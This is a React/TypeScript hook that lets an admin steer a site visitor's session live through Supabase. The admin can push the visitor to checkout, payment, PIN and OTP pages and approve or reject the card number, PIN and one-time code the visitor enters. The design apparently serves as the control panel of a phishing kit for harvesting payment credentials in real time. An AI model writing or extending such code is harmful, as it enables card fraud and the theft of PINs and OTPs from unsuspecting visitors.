import { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { getVisitorSessionId } from "@/hooks/useVisitorTracking";

/**
 * Listens for admin-issued commands targeted at this visitor's session.
 *
 * Supported commands:
 *  - "navigate" with payload { path: string }
 *  - shortcuts: "go_checkout" | "go_payment" | "go_pin" | "go_otp" | "go_success" | "go_home"
 *  - "reload"
 *  - approval/rejection (handled by individual payment pages via window event):
 *      "approve_card" | "reject_card"
 *      "approve_pin"  | "reject_pin"
 *      "approve_otp"  | "reject_otp"
 */
const SHORTCUTS: Record<string, string> = {
  go_home: "/",
  go_checkout: "/checkout",
  go_payment: "/payment",
  go_pin: "/payment/pin",
  go_otp: "/payment/otp",
  go_success: "/success",
};

const APPROVAL_COMMANDS = new Set([
  "approve_card", "reject_card",
  "approve_pin", "reject_pin",
  "approve_otp", "reject_otp",
]);

const LAST_CMD_KEY = "sl_last_cmd_id";

export const useVisitorCommands = () => {
  const navigate = useNavigate();

  useEffect(() => {
    // Don't subscribe to visitor commands while inside the admin panel.
    if (typeof window !== "undefined" && window.location.pathname.startsWith("/admin")) {
      return;
    }
    const session_id = getVisitorSessionId();
    if (session_id === "__admin_placeholder__") return;

    const handle = (cmd: { id: string; command: string; payload: any }) => {
      if (!cmd?.id) return;
      if (sessionStorage.getItem(LAST_CMD_KEY) === cmd.id) return;
      sessionStorage.setItem(LAST_CMD_KEY, cmd.id);

      const c = cmd.command;
      if (c === "reload") {
        window.location.reload();
        return;
      }
      if (c === "navigate") {
        const path = cmd.payload?.path;
        if (typeof path === "string" && path.startsWith("/")) navigate(path);
        return;
      }
      if (APPROVAL_COMMANDS.has(c)) {
        // Dispatch a window event so the active payment page can react
        window.dispatchEvent(new CustomEvent("visitor-approval", { detail: { command: c, payload: cmd.payload } }));
        return;
      }
      const target = SHORTCUTS[c];
      if (target) navigate(target);
    };

    // Pick up any command issued while page was loading
    (async () => {
      const { data } = await supabase
        .from("visitor_commands")
        .select("id, command, payload, created_at")
        .eq("session_id", session_id)
        .order("created_at", { ascending: false })
        .limit(1);
      if (data && data[0]) handle(data[0] as any);
    })();

    const channel = supabase
      .channel(`visitor_cmd_${session_id}`)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "visitor_commands",
          filter: `session_id=eq.${session_id}`,
        },
        (payload) => handle(payload.new as any),
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [navigate]);
};
